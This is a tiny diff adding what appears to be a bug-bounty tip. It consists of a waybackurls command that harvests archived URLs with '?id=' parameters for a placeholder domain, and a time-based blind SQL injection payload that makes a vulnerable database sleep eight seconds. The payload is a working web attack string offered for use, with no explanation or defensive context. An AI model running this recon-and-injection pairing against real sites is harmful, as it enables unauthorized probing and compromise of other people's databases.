@@ -1,0 +1,3 @@
+waybackurls --dates domain(.)com | grep '?id='
+
+Payload : if(now()=sysdate(),SLEEP(8),0) //credit linkedin
